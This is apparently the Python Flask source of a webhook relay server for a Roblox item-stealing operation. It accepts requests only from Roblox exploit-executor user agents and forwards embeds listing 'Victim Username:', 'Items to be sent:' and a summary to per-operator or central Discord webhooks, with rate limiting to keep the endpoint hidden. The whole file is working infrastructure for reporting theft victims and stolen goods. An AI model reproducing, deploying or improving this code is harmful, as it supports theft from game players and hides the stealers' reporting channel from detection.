from flask import Flask, request, jsonify
import requests
import json
import os
import time
from collections import defaultdict


from dotenv import load_dotenv  # ✅ Add this line

import sys
sys.path.append('/root/common')
from database import get_webhook

app = Flask(__name__)
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")

# List of accepted user-agents
ACCEPTED_USER_AGENTS = [
    "codex android",
    "vega x android",
    "appleware ios",
    "delta android",
    "fluxus",
    "arceus x android",
    "trigon android",
    "evon android",
    "alysse android",
    "delta/v1.0",
    "roblox/darwinrobloxapp/0.626.1.6260363 (globaldist; robloxdirectdownload)",
    "hydrogen/v1.0",
    "hydrogen/v3.0",
    "roblox/wininet"
]

BLOCKED_IPS = []
BLOCKED_IPS_FILE = 'blocked_ips.json'
USER_AGENT_FILE = 'user_agents.json'
REQUEST_LIMIT = 3
TIME_WINDOW = 60
request_log = defaultdict(list)

initialized = False

def load_blocked_ips():
    if os.path.exists(BLOCKED_IPS_FILE):
        with open(BLOCKED_IPS_FILE, 'r') as file:
            return json.load(file)
    return []

def save_blocked_ips():
    with open(BLOCKED_IPS_FILE, 'w') as file:
        json.dump(BLOCKED_IPS, file)

def load_user_agents():
    if os.path.exists(USER_AGENT_FILE):
        with open(USER_AGENT_FILE, 'r') as file:
            return json.load(file)
    return {}

def save_user_agents(user_agents):
    with open(USER_AGENT_FILE, 'w') as file:
        json.dump(user_agents, file)

@app.before_request
def block_ip():
    global initialized
    if not initialized:
        global BLOCKED_IPS
        BLOCKED_IPS = load_blocked_ips()
        initialized = True

    ip = request.remote_addr
    
    current_time = time.time()
    request_log[ip] = [timestamp for timestamp in request_log[ip] if current_time - timestamp <= TIME_WINDOW]
    request_log[ip].append(current_time)

    if len(request_log[ip]) > REQUEST_LIMIT:
        if ip not in BLOCKED_IPS:
            BLOCKED_IPS.append(ip)
            save_blocked_ips()
        return jsonify({'error': 'Unauthorized'}), 403
    
    if ip in BLOCKED_IPS:
        return jsonify({'error': 'Unauthorized'}), 403

@app.route('/postwebhook', methods=['POST'])
def send_webhook():
    user_agent = request.headers.get('User-Agent', '').lower()
    discUser = request.headers.get('DiscUser', '')

    if user_agent not in ACCEPTED_USER_AGENTS:
        return jsonify({'error': 'Unauthorized'}), 403

    request_json = request.get_json()
    if any('@' in str(value) for value in request_json.values()):
        return jsonify({'error': 'Unauthorized'}), 403

    webhook_url = get_webhook(discUser)
    if not webhook_url:
        return jsonify({'error': 'Unauthorized'}), 403

    embeds = request_json.get("embeds", [])
    if len(embeds) != 1 or not isinstance(embeds[0], dict):
        return jsonify({'error': 'Unauthorized'}), 403

    fields = embeds[0].get("fields", [])
    if len(fields) != 3 or fields[0].get("name") != "Victim Username:":
        return jsonify({'error': 'Unauthorized'}), 403

    if " " in fields[0].get("value", "hi mate") or len(fields[0].get("value", "thisisover20characters")) > 20:
        return jsonify({'error': 'Unauthorized'}), 403
    if fields[1].get("name") != "Items to be sent:":
        return jsonify({'error': 'Unauthorized'}), 403
    if fields[2].get("name") != "Summary:":
        return jsonify({'error': 'Unauthorized'}), 403

    # Forward the request to the Discord webhook
    response = requests.post(webhook_url, json=request_json)

    return jsonify({'status': 'success'}), response.status_code

@app.route('/webhook', methods=['POST'])
def proxy_webhook():
    user_agent = request.headers.get('User-Agent', '').lower()

    user_agents = load_user_agents()
    if user_agent in user_agents:
        user_agents[user_agent] += 1
    else:
        user_agents[user_agent] = 1
    save_user_agents(user_agents)

    if user_agent not in ACCEPTED_USER_AGENTS:
        return jsonify({'error': 'Unauthorized'}), 403

    request_json = request.get_json()
    if any('@' in str(value) for value in request_json.values()):
        return jsonify({'error': 'Unauthorized'}), 403

    embeds = request_json.get("embeds", [])
    if len(embeds) != 1 or not isinstance(embeds[0], dict):
        return jsonify({'error': 'Unauthorized'}), 403

    fields = embeds[0].get("fields", [])
    if len(fields) != 3 or fields[0].get("name") != "Victim Username:":
        return jsonify({'error': 'Unauthorized'}), 403

    if " " in fields[0].get("value", "hi mate") or len(fields[0].get("value", "thisisover20characters")) > 20:
        return jsonify({'error': 'Unauthorized'}), 403
    if fields[1].get("name") != "Items to be sent:":
        return jsonify({'error': 'Unauthorized'}), 403
    if fields[2].get("name") != "Summary:":
        return jsonify({'error': 'Unauthorized'}), 403
    
    request_json["embeds"][0]["fields"][0]["value"] = "Username redacted"

    # Forward the request to the Discord webhook
    response = requests.post(DISCORD_WEBHOOK_URL, json=request_json)

    return jsonify({'status': 'success'}), response.status_code

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
